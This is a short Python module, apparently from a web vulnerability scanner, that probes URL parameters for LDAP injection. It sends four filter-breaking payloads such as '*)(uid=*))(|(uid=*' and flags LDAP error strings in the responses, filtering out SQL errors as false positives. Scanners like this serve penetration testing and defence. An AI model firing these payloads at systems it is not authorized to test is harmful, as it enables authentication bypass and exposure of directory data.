#!/usr/bin/env python3
"""
⚠️ LDAP Injection (CWE-90) — OWASP A05:2025
"""

from colorama import Fore, Style

class LDAPInjection:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
    
    def scan(self, params):
        print(f"\n{Fore.CYAN}[⚠️ LDAP INJECTION] {Style.RESET_ALL}\n")
        
        payloads = [
            "*)(uid=*))(|(uid=*",
            "admin)(&",
            "admin)(!(&(1=0",
            "*)(|(objectClass=*))",
        ]
        
        baseline = self.engine.get_baseline()
        vulnerabilities = []
        
        for param in params:
            print(f"  {Fore.BLUE}→ Test paramètre: {Fore.YELLOW}{param}{Style.RESET_ALL}")
            
            for payload in payloads:
                url = self.engine.build_url(param, payload)
                if not url:
                    continue
                
                try:
                    resp = self.engine.session.get(url, timeout=5)
                    
                    # 🔍 Vérifier que ce n'est pas une erreur SQL (faux positif)
                    sql_error_patterns = ['sql syntax', 'mysql error', 'pdoexception', 'sqlstate']
                    is_sql_error = any(pattern in resp.text.lower() for pattern in sql_error_patterns)
                    
                    if is_sql_error:
                        continue  # ❌ Faux positif : erreur SQL, pas LDAP
                    
                    # ✅ Vraie détection LDAP
                    if any(x in resp.text.lower() for x in ['ldap', 'objectclass', 'javax.naming']):
                        vuln = {
                            'type': 'ldap',
                            'cwe': 'CWE-90',
                            'param': param,
                            'payload': payload,
                            'url': url,
                            'evidence': 'Erreur LDAP détectée'
                        }
                        vulnerabilities.append(vuln)
                        print(f"\n    {Fore.CYAN}[💥 LDAP Injection CONFIRMÉ] {Style.RESET_ALL}{param}")
                        print(f"      Payload: {payload}")
                        print(f"      URL: {url}\n")
                        break
                except:
                    continue
        
        return vulnerabilities